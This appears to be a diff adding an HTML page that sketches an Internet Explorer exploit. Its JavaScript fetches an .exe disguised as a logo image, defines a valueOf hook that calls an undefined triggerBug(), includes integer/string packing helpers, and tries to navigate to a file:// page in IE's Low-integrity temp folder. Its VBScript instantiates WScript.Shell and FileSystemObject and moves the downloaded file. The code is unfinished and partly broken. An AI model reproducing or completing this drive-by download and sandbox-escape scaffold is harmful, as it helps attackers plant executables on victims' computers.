@@ -1,0 +1,71 @@
+
+<HTML>
+<HEAD>
+</HEAD>
+<BODY>
+
+<Script Language=JavaScript>
+var userAgent = navigator.userAgent;
+var oReq;
+function helloJs()
+{
+	alert("helloJs");
+}
+function getdll()
+{
+	alert("downloading...");
+    oReq = new XMLHttpRequest();
+    oReq.open("GET", "https://www.baidu.com/img/bd_logo1.exe", true);
+    oReq.onreadystatechange = handler;
+    oReq.send();
+}
+function handler()
+{
+    if (oReq.readyState == 4 && oReq.status == 200) {
+        OnDownloadDone();
+    }
+}
+function tolocal()
+{
+    location.href = "file://C:/Users/admin/AppData/Local/Microsoft/Windows/Temporary Internet Files/Low/system32/q.htm";
+}
+function strToInt(s)
+{
+    return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
+}
+function intToStr(x)
+{
+    return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
+}
+var o;
+o = {"valueOf": function () {
+        triggerBug();
+        return 1;
+    }};
+</Script>
+
+<Script Language=VBScript>
+
+Dim oWS
+Dim Fso
+Set oWS = CreateObject("WScript.Shell")
+Set Fso = CreateObject("Scripting.FileSystemObject")
+
+
+downloadFiles = "bd_logo1.png"
+
+getdll()
+
+Sub OnDownloadDone()
+	MsgBox("Download Done")
+	
+	'tolocal()
+	
+	Fso.MoveFile "C:/Users/admin/AppData/Local/Microsoft/Windows/Temporary Internet Files/Low/bd_logo1.png", "C:/Users/admin/AppData/Local/Microsoft/Windows/Temporary Internet Files/Low/B.txt"
+
+End Sub
+
+</Script>
+
+</BODY>
+</HTML>
